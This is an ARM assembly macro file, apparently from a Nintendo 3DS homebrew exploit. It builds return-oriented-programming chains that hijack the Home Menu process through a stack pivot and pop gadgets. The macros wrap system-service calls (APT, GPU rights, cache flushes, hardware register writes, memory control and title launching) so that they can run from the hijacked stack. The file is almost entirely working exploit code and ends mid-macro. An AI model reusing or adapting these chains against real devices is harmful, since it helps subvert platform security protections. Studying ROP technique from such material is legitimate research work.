MENU_STACK_PIVOT equ ROP_MENU_STACK_PIVOT ; our stack pivot (found by yellows8) : ldmdavc r4, {r4, r5, r8, sl, fp, ip, sp, pc}
MENU_NOP equ ROP_MENU_POP_PC ; pop {pc}

MENU_SLEEP equ ROP_MENU_SLEEPTHREAD
MENU_CONNECTTOPORT equ ROP_MENU_CONNECTTOPORT

MENU_NSS_LAUNCHTITLE equ ROP_MENU_NSS_LAUNCHTITLE ; r0 : out_ptr, r1 : unused ?, r2 : tidlow, r3 : tidhigh, sp_0 : flag
MENU_GSPGPU_RELEASERIGHT equ ROP_MENU_GSPGPU_RELEASERIGHT ; r0 : handle addr
MENU_GSPGPU_ACQUIRERIGHT equ ROP_MENU_GSPGPU_ACQUIRERIGHT ; r0 : handle addr
MENU_GSPGPU_FLUSHDATACACHE equ ROP_MENU_GSPGPU_FLUSHDATACACHE ; r0 : gsp handle ptr, r1 : process handle, r2 : address, r3 : size
MENU_GSPGPU_WRITEHWREGS equ ROP_MENU_GSPGPU_WRITEHWREGS ; r0 : base reg, r1 : data ptr, r2 : data size
MENU_GSPGPU_GXTRYENQUEUE equ ROP_MENU_GSPGPU_GXTRYENQUEUE ; r0 : interrupt receiver ptr, r1 : gx cmd data ptr
MENU_MEMCPY equ ROP_MENU_MEMCPY ; r0 : dst, r1 : src, r2 : size
MENU_NWMEXT_HANDLE equ (MENU_LOADEDROP_BUFADR + nwmextHandle)

; DUMMY_PTR equ (WAITLOOP_DST - 4)
DUMMY_PTR equ (MENU_LOADEDROP_BUFADR - 4)

.macro set_lr,_lr
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_NOP ; pop {pc}
	.word ROP_MENU_POP_R4LR_BX_R0 ; pop {r4, lr} ; bx r0
		.word 0xDEADBABE ; r4 (garbage)
		.word _lr ; lr
.endmacro

.macro nss_launch_title,tidlow,tidhigh
	set_lr ROP_MENU_POP_R4PC ; pop {r4, pc}
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_OBJECT_LOC - 4 ; r0 (out ptr)
	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word tidlow ; r2 (tid low) 
		.word tidhigh ; r3 (tid high)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word MENU_NSS_LAUNCHTITLE
		.word 0x00000001 ; sp_0 (flag)
		; .word 0x000000F5 ; sp_0 (flag) (sets notification when process dies but currently breaks stuff (might need to read the notification ?))
.endmacro

; this memcpy's the size bytes that immediately preceed its call
.macro memcpy_r0_lr_prev,size,skip,offset
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word (MENU_OBJECT_LOC + offset + (. - 4 - size) - object) ; r1 (src)
	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word size ; r2 (size)
		.word 0xDEADBABE ; r3 (garbage)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.if skip != 0
		skip_0x1C
	.endif
	.word MENU_MEMCPY
.endmacro

.macro memcpy_r0_lr,src,size
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word src ; r1 (src)
	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word size ; r2 (size)
		.word 0xDEADBABE ; r3 (garbage)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word MENU_MEMCPY
.endmacro

.macro memcpy,dst,src,size,skip,offset
	set_lr MENU_NOP
	.if skip != 0
		store MENU_MEMCPY, @@function_call + MENU_LOADEDROP_BUFADR + offset
	.endif
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word dst ; r0 (out ptr)
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word src ; r1 (src)
	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word size ; r2 (size)
		.word 0xDEADBABE ; r3 (garbage)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.if skip != 0
		skip_0x1C
	.endif
	@@function_call:
	.word MENU_MEMCPY
.endmacro

.macro create_event,handle_outptr,resettype
	set_lr MENU_NOP
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word handle_outptr ; r0 (out ptr)
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word resettype ; r1 (src)
	.word ROP_MENU_SVC_CREATEEVENT
.endmacro

.macro exit_process
	.word ROP_MENU_SVC_EXITPROCESS
.endmacro

.macro wait_synchronizationn,out,handles,handlecount,waitall,nanosecs_low,nanosecs_high,skip,offset
	set_lr ROP_MENU_POP_R4R5PC
	.if skip != 0
		store ROP_MENU_SVC_WAITSYNCHRONIZATIONN, @@function_call + MENU_LOADEDROP_BUFADR + offset
	.endif
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word out ; r0 (out ptr)
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word handles ; r1 (src)
	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word handlecount ; r2 (size)
		.word waitall ; r3 (flag)
		.word 0xDEAD1000 ; r4 (garbage)
		.word 0xDEAD2000 ; r5 (garbage)
		.word 0xDEAD3000 ; r6 (garbage)
	@@function_call:
	.word ROP_MENU_SVC_WAITSYNCHRONIZATIONN
		.word nanosecs_low
		.word nanosecs_high
.endmacro

.macro skip_0x84
	.word ROP_MENU_ADD_SPSPx64_POP_R4RR11PC
		.fill 0x84, 0xDA
.endmacro

.macro skip_0x1C
	.word ROP_MENU_POP_R4R5R6R7R8R9R10PC
		.fill 0x1C, 0xDA
.endmacro

.macro apt_open_session,skip,offset
	set_lr MENU_NOP
	.if skip != 0
		store ROP_MENU_APT_OPENSESSION, @@opensession_call + MENU_LOADEDROP_BUFADR + offset
		skip_0x84
	.endif
	@@opensession_call:
	.word ROP_MENU_APT_OPENSESSION
.endmacro

.macro apt_close_session,skip,offset
	set_lr MENU_NOP
	.if skip != 0
		store ROP_MENU_APT_CLOSESESSION, @@closesession_call + MENU_LOADEDROP_BUFADR + offset
		skip_0x84
	.endif
	@@closesession_call:
	.word ROP_MENU_APT_CLOSESESSION
.endmacro

.macro apt_glance_parameter,app_id,buffer_ptr,buffer_size,out_cmd_ptr,out_handle_ptr,skip,offset
	; first dereference handle_ptr
	.if skip != 0
		store ROP_MENU_APT_GLANCEPARAMETER, @@glance_call + MENU_LOADEDROP_BUFADR + offset
	.endif
	set_lr ROP_MENU_POP_R4R5R6PC
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word DUMMY_PTR ; r0 (app_id out ptr)
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word app_id ; r1 (app_id)
	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word out_cmd_ptr ; r2 (signal out ptr)
		.word DUMMY_PTR ; r3 (out buffer ptr)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.if skip != 0
		skip_0x84
	.endif
	@@glance_call:
	.word ROP_MENU_APT_GLANCEPARAMETER
		.word 0x00000000 ; arg_0 (out buffer size) (r4 (garbage))
		.word DUMMY_PTR ; arg_4 (actual size out ptr) (r5 (garbage))
		.word DUMMY_PTR ; arg_8 (handle out ptr) (r6 (garbage))
.endmacro

.macro apt_receive_parameter,app_id,buffer_ptr,buffer_size,out_cmd_ptr,out_handle_ptr,skip,offset
	; first dereference handle_ptr
	.if skip != 0
		store ROP_MENU_APT_RECEIVEPARAMETER, @@function_call + MENU_LOADEDROP_BUFADR + offset
	.endif
	set_lr ROP_MENU_POP_R4R5R6PC
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word DUMMY_PTR ; r0 (app_id out ptr)
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word app_id ; r1 (app_id)
	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word out_cmd_ptr ; r2 (signal out ptr)
		.word DUMMY_PTR ; r3 (out buffer ptr)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.if skip != 0
		skip_0x84
	.endif
	@@function_call:
	.word ROP_MENU_APT_RECEIVEPARAMETER
		.word 0x00000000 ; arg_0 (out buffer size) (r4 (garbage))
		.word DUMMY_PTR ; arg_4 (actual size out ptr) (r5 (garbage))
		.word DUMMY_PTR ; arg_8 (handle out ptr) (r6 (garbage))
.endmacro

.macro apt_inquire_notification,app_id,out_ptr,skip,offset
	; first dereference handle_ptr
	set_lr MENU_NOP
	.if skip != 0
		store ROP_MENU_APT_INQUIRENOTIFICATION, @@function_call + MENU_LOADEDROP_BUFADR + offset
	.endif
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word app_id ; r0 (app_id out ptr)
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word out_ptr ; r1 (app_id)
	.if skip != 0
		skip_0x1C
	.endif
	@@function_call:
	.word ROP_MENU_APT_INQUIRENOTIFICATION
.endmacro

.macro apt_send_parameter,dst_id,buffer_ptr,buffer_size,handle_ptr
	; first dereference handle_ptr
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word handle_ptr ; r0
	.word ROP_MENU_LDR_R0R0_POP_R4PC ; ldr r0, [r0] ; pop {r4, pc}
		.word MENU_LOADEDROP_BUFADR + @@handle_loc ; r4 (destination address)
	.word ROP_MENU_STR_R0R4_POP_R4PC ; str r0, [r4] ; pop {r4, pc}
		.word 0xDEADBABE ; r4 (garbage)
	set_lr ROP_MENU_POP_R4R5PC
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word 0x101 ; r0 (source app_id)
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word dst_id ; r1 (destination app_id)
	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word 0x00000001 ; r2 (signal type)
		.word buffer_ptr ; r3 (parameter buffer ptr)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word ROP_MENU_APT_SENDPARAMETER
		.word buffer_size ; arg_0 (parameter buffer size) (r4 (garbage))
		@@handle_loc:
		.word 0xDEADBABE ; arg_4 (handle passed to dst) (will be overwritten by dereferenced handle_ptr) (r5 (garbage))
.endmacro

.macro apt_prepare_start_application,tid_low,tid_high,mediatype,flag
	; first dereference handle_ptr
	set_lr ROP_MENU_POP_R2R3R4R5R6PC
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_OBJECT_LOC + @@tid_struct ; r0
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word flag ; r1
	.word ROP_MENU_APT_PREPARETOSTARTAPPLICATION
		@@tid_struct:
		.word tid_low ; r2
		.word tid_high ; r3
		.word mediatype ; r4
		.word 0 ; r5
		.word 0xDEADBABE ; r6 (garbage)
.endmacro

.macro apt_start_application,buf0,buf0_size,buf1,buf1_size,flag
	set_lr ROP_MENU_POP_R4PC
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word buf0 ; r0 (buf0 ptr)
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word buf0_size ; r1 (buf0 size)
	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word buf1 ; r2 (buf1 ptr)
		.word buf1_size ; r3 (buf1 size)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word ROP_MENU_APT_STARTAPPLICATION
		.word flag ; arg_0 (flag) (r4 (garbage))
.endmacro

.macro apt_send_deliver_arg,buf0,buf0_size,buf1,buf1_size
	set_lr ROP_MENU_POP_PC
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word buf0 ; r0 (buf0 ptr)
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word buf0_size ; r1 (buf0 size)
	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word buf1 ; r2 (buf1 ptr)
		.word buf1_size ; r3 (buf1 size)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word ROP_MENU_APT_SENDDELIVERARG
.endmacro

.macro apt_reply_sleepquery,appid,a
	set_lr ROP_MENU_POP_PC
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word appid ; r0
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word a ; r1
	.word ROP_MENU_APT_REPLYSLEEPQUERY
.endmacro

.macro apt_reply_sleepnotification_complete,appid
	set_lr ROP_MENU_POP_PC
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word appid ; r0
	.word ROP_MENU_APT_REPLYSLEEPNOTIFICATIONCOMPLETE
.endmacro

.macro apt_is_registered,appid,out,skip,offset
	set_lr ROP_MENU_POP_PC
	.if skip != 0
		store ROP_MENU_APT_ISREGISTERED, @@function_call + MENU_LOADEDROP_BUFADR + offset
	.endif
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word appid ; r0
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word out ; r1
	.if skip != 0
		skip_0x1C
	.endif
	@@function_call:
	.word ROP_MENU_APT_ISREGISTERED
.endmacro

.macro apt_order_close_application
	set_lr ROP_MENU_POP_PC
	.word ROP_MENU_APT_ORDERTOCLOSEAPPLICATION
.endmacro

.macro apt_wakeup_application,skip,offset
	set_lr ROP_MENU_POP_PC
	.if skip != 0
		store ROP_MENU_APT_WAKEUPAPPLICATION, @@function_call + MENU_LOADEDROP_BUFADR + offset
		skip_0x84
	.endif
	@@function_call:
	.word ROP_MENU_APT_WAKEUPAPPLICATION
.endmacro

.macro apt_applet_utility_cmd2
	set_lr ROP_MENU_POP_PC
	.word ROP_MENU_APT_APPLETUTILITYCMD2
.endmacro

.macro apt_applet_utility_cmd7,val
	set_lr ROP_MENU_POP_PC
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word val ; r0
	.word ROP_MENU_APT_APPLETUTILITYCMD7
.endmacro

.macro apt_clear_homebutton_state
	set_lr ROP_MENU_POP_PC
	.word ROP_MENU_CLEARHOMEBUTTONSTATE
.endmacro

.macro apt_prepare_leave_homemenu,skip,offset
	set_lr ROP_MENU_POP_PC
	.if skip != 0
		store ROP_MENU_APT_PREPARETOLEAVEHOMEMENU, @@function_call + MENU_LOADEDROP_BUFADR + offset
		skip_0x84
	.endif
	@@function_call:
	.word ROP_MENU_APT_PREPARETOLEAVEHOMEMENU
.endmacro

.macro apt_leave_homemenu,skip,offset
	.if skip != 0
		store ROP_MENU_APT_LEAVEHOMEMENU, @@function_call + MENU_LOADEDROP_BUFADR + offset
	.endif
	set_lr ROP_MENU_POP_PC
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word 0x00000000 ; r0 (buf0 ptr)
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word 0x00000000 ; r1 (buf0 size)
	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word 0x00000000 ; r2 (flag ?)
		.word 0x00000000 ; r3 (garbage)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.if skip != 0
		skip_0x84
	.endif
	@@function_call:
	.word ROP_MENU_APT_LEAVEHOMEMENU
.endmacro

.macro wait_for_parameter_and_send,buffer_ptr, handle_ptr
	store MENU_LOADEDROP_BUFADR + @@ret_sp, MENU_LOADEDROP_BUFADR + waitForParameter_loop_retsp
	store MENU_STACK_PIVOT, MENU_LOADEDROP_BUFADR + waitForParameter_loop_pivot
	store handle_ptr, MENU_LOADEDROP_BUFADR + waitForParameter_loop_handle_ptr
	store buffer_ptr, MENU_LOADEDROP_BUFADR + waitForParameter_loop_buffer_ptr
	jump_sp MENU_LOADEDROP_BUFADR + waitForParameter_loop_memcpy
	@@ret_sp:
.endmacro

.macro jump_sp,dst
	.word ROP_MENU_POP_R4PC
		.word MENU_OBJECT_LOC + @@pivot_data + 4 ; r4 (pivot data location)
	.word ROP_MENU_STACK_PIVOT
	.word ROP_MENU_POP_R4R5PC
	@@pivot_data:
		.word dst ; sp
		.word MENU_NOP ; pc
.endmacro

.macro jump_sp_if_ne,cond_sp
	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word ROP_MENU_STACK_PIVOT ; r2 (pivot address)
		.word 0xDEADBABE ; r3 (garbage)
		.word MENU_OBJECT_LOC + @@cond_pivot_data + 4 ; r4 (pivot data location)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word ROP_MENU_BLXNE_R2_ADD_SPx8_MOV_R0R4_POP_R4R5R6R7R8PC
	@@cond_pivot_data:
		.word cond_sp ; sp
		.word MENU_NOP ; pc
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
		.word 0xDEADBABE ; r7 (garbage)
		.word 0xDEADBABE ; r8 (garbage)
.endmacro

.macro cond_jump_sp_r0,cond_sp,cmpval_imm
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word cmpval_imm ; r1 (ptr)
	.word ROP_MENU_CMP_R0R1_MVNLS_R0x0_MOVHI_R0x1_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
	jump_sp_if_ne cond_sp
.endmacro

.macro cond_jump_sp,cond_sp,cmpval_adr,cmpval_imm
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word cmpval_adr ; r0 (ptr)
	.word ROP_MENU_LDR_R0R0_POP_R4PC ; pop {r0, pc}
		.word 0xDEADBABE ; r4 (garbage)
	cond_jump_sp_r0 cond_sp, cmpval_imm
.endmacro

.macro gsp_acquire_right
	set_lr MENU_NOP
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_GSPGPU_HANDLE ; r0 (gsp handle ptr)
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word 0xFFFF8001 ; r1 (process handle)
	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word 0x00000000 ; r2 (flags)
		.word 0xDEADBABE ; r2 (garbage)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word MENU_GSPGPU_ACQUIRERIGHT
.endmacro

.macro gsp_try_acquire_right
	get_cmdbuf 0
	.word ROP_MENU_POP_R4R5R6PC
		.word 0x00150002 ; command header
		.word 0x00000000
		.word 0xFFFF8001 ; process handle
	memcpy_r0_lr_prev (4 * 3), 1, 0
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_GSPGPU_HANDLE ; r0 (gsp:gpu handle)
	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
	.word ROP_MENU_LDR_R0R0_SVC_x32_AND_R1R0x80000000_CMP_R1x0_LDRGE_R0R4x4_POP_R4PC ; ldr r0, [r0] ; svc 0x00000032 ; and r1, r0, #-2147483648 ; cmp r1, #0 ; ldrge r0, [r4, #4] ; pop {r4, pc}
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro dsp_register_interrupt_events
	set_lr MENU_NOP
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_DSP_HANDLE_STRUCT + 0x10 ; r0 (dsp handle ptr)
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word 0x00000000 ; r1 (interrupt handle)
	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word 0x00000002 ; r2 (param0)
		.word 0x00000002 ; r2 (param1)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word ROP_MENU_DSP_REGISTERINTERRUPTEVENTS
.endmacro

.macro dsp_unload_component
	set_lr MENU_NOP
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_DSP_HANDLE_STRUCT + 0x10 ; r0 (dsp handle ptr)
	.word ROP_MENU_DSP_UNLOADCOMPONENT
.endmacro

.macro gsp_release_right
	set_lr MENU_NOP
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_GSPGPU_HANDLE ; r0 (gsp handle ptr)
	.word MENU_GSPGPU_RELEASERIGHT
.endmacro

.macro flush_dcache,addr,size
	set_lr MENU_NOP
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_GSPGPU_HANDLE ; r0 (handle ptr)
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word 0xFFFF8001 ; r1 (process handle)
	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word addr ; r2 (addr)
		.word size ; r3 (src)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word MENU_GSPGPU_FLUSHDATACACHE
.endmacro

.macro writehwregs,reg,data,size
	set_lr MENU_NOP
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_GSPGPU_HANDLE ; r0 (handle ptr)
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word reg ; r1 (reg base)
	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word data ; r2 (data ptr)
		.word size ; r3 (size)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word MENU_GSPGPU_WRITEHWREGS
.endmacro

.macro control_memory,outaddr,addr0,addr1,size,operation,permissions
	set_lr ROP_MENU_POP_R4R5PC
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word outaddr ; r0
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word addr0 ; r1
	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word addr1 ; r2
		.word size ; r3 (size)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word ROP_MENU_CONTROLMEMORY
		.word operation ; arg_0
		.word permissions ; arg_4
.endmacro

.macro free_memory_deref,ptr,size
	set_lr ROP_MENU_POP_R4R5PC
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word ptr - 4 ; r0
	.word ROP_MENU_LDR_R1R0x4_ADD_R0R0R1_POP_R3R4R5PC
		.word 0xDEADBABE ; r3 (garbage)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word DUMMY_PTR ; r0
	.word ROP_MENU_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word 0x00000000 ; r2
		.word size ; r3 (size)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word ROP_MENU_CONTROLMEMORY
		.word 0x00000001 ; arg_0
		.word 0x00000000 ; arg_4
.endmacro

.macro writehwreg,reg,data
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		@@reg_data:
			.word data ; r0 (just used to skip over data)
	writehwregs reg, (MENU_OBJECT_LOC + @@reg_data - object), 0x4
.endmacro

.macro get_cmdbuf,offset
	set_lr MENU_NOP
	.word ROP_MENU_MRC_R0C13C03_ADD_R0R0x5C_BX_LR ; mrc 15, 0, r0, cr13, cr0, {3} ; add r0, r0, #0x5c ; bx lr
	.word ROP_MENU_POP_R1PC ; pop {r1, pc}
		.word (0x80+offset-0x5C) / 4 ; r1
	.word ROP_MENU_ADD_R0R0R1LSL2_POP_R4PC ; add r0, r0, r1, lsl #2 ; pop {r4, pc}
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro srv_subscribe_notification,id
	set_lr MENU_NOP
	.word ROP_MENU_POP_R0PC
		.word id
	.word ROP_MENU_SRV_SUBSCRIBE
.endmacro

.macro srv_get_handle,str_ptr,len,out_ptr
	set_lr MENU_NOP
	.word ROP_MENU_POP_R0PC
		.word out_ptr
	.word ROP_MENU_POP_R1PC
		.word str_ptr
	.word ROP_MENU_POP_R2R3R4R5R6PC
		.word len
		.word 0x00000000
		.word 0xDEADBABE
		.word 0xDEADBABE
		.word 0xDEADBABE
	.word ROP_MENU_SRV_GETHANDLE
.endmacro

.macro srv_receive_notification
	get_cmdbuf 0
	.word ROP_MENU_POP_R1PC
		.word 0x000B0000 ; command header
	.word ROP_MENU_STR_R1R0_POP_R4PC
		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_SRV_HANDLE ; r0 (gsp:gpu handle)
	.word ROP_MENU_LDR_R0R0_SVC_x32_AND_R1R0x80000000_CMP_R1x0_LDRGE_R0R4x4_POP_R4PC ; ldr r0, [r0] ; svc 0x00000032 ; and r1, r0, #-2147483648 ; cmp r1, #0 ; ldrge r0, [r4, #4] ; pop {r4, pc}
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro ptm_configure_n3ds,val_ptr,offset
	store ROP_MENU_POP_R4PC, MENU_LOADEDROP_BUFADR + @@function_call + offset
	load_store val_ptr, MENU_LOADEDROP_BUFADR + @@param + offset
	.word ROP_MENU_POP_R1PC
		.word 0xFF
	.word ROP_MENU_CMP_R0R1_MVNLS_R0x0_MOVHI_R0x1_POP_R4PC ; relies on load_store leaving value in r0
		.word ROP_MENU_LDR_R0R0_SVC_x32_AND_R1R0x80000000_CMP_R1x0_LDRGE_R0R4x4_POP_R4PC
	.word ROP_MENU_POP_R0PC
		.word MENU_LOADEDROP_BUFADR + @@function_call + offset - 4
	.word ROP_MENU_STRNE_R4R0x4_POP_R4PC
		.word 0xDEADBABE ; r4 (garbage)
	get_cmdbuf 0
	.word ROP_MENU_POP_R4R5PC
		.word 0x08180040 ; command header
		@@param:
		.word 0xDEADBABE ; value (overwritte)
	memcpy_r0_lr_prev (4 * 2), 1, offset
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_PTMSYSM_HANDLE ; r0 (gsp:gpu handle)
	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
	@@function_call:
	.word ROP_MENU_LDR_R0R0_SVC_x32_AND_R1R0x80000000_CMP_R1x0_LDRGE_R0R4x4_POP_R4PC ; ldr r0, [r0] ; svc 0x00000032 ; and r1, r0, #-2147483648 ; cmp r1, #0 ; ldrge r0, [r4, #4] ; pop {r4, pc}
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro nss_shutdown_async
	get_cmdbuf 0
	.word ROP_MENU_POP_R1PC
		.word 0x000E0000 ; command header
	.word ROP_MENU_STR_R1R0_POP_R4PC
		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_NSS_HANDLE ; r0
	.word ROP_MENU_LDR_R0R0_SVC_x32_AND_R1R0x80000000_CMP_R1x0_LDRGE_R0R4x4_POP_R4PC ; ldr r0, [r0] ; svc 0x00000032 ; and r1, r0, #-2147483648 ; cmp r1, #0 ; ldrge r0, [r4, #4] ; pop {r4, pc}
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro ptm_configure_n3ds_imm,val
	get_cmdbuf 0
	.word ROP_MENU_POP_R4R5PC
		.word 0x08180040 ; command header
		@@param:
		.word val ; value
	memcpy_r0_lr_prev (4 * 2), 1, 0
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_PTMSYSM_HANDLE ; r0 (gsp:gpu handle)
	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
		.word DUMMY_PTR ; r4 (dummy but address needs to be valid/readable)
	@@function_call:
	.word ROP_MENU_LDR_R0R0_SVC_x32_AND_R1R0x80000000_CMP_R1x0_LDRGE_R0R4x4_POP_R4PC ; ldr r0, [r0] ; svc 0x00000032 ; and r1, r0, #-2147483648 ; cmp r1, #0 ; ldrge r0, [r4, #4] ; pop {r4, pc}
		.word 0xDEADBABE ; r4 (garbage)
.endmacro

.macro invalidate_dcache,addr,size
	get_cmdbuf 0
	.word ROP_MENU_POP_R4R5R6R7R8PC ; pop {r4, r5, r6, r7, r8, pc}
		; nss_terminate_tid_cmd_buf:
		.word 0x00090082 ; command header
		.word addr ; address
		.word size ; size
		.word 0x00000000 ; size
		.word 0xFFFF8001 ; process handle
	memcpy_r0_lr_prev (4 * 5), 1, 0
	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
		.word MENU_GSPGPU_HANDLE ; r0 (gsp:gpu handle)
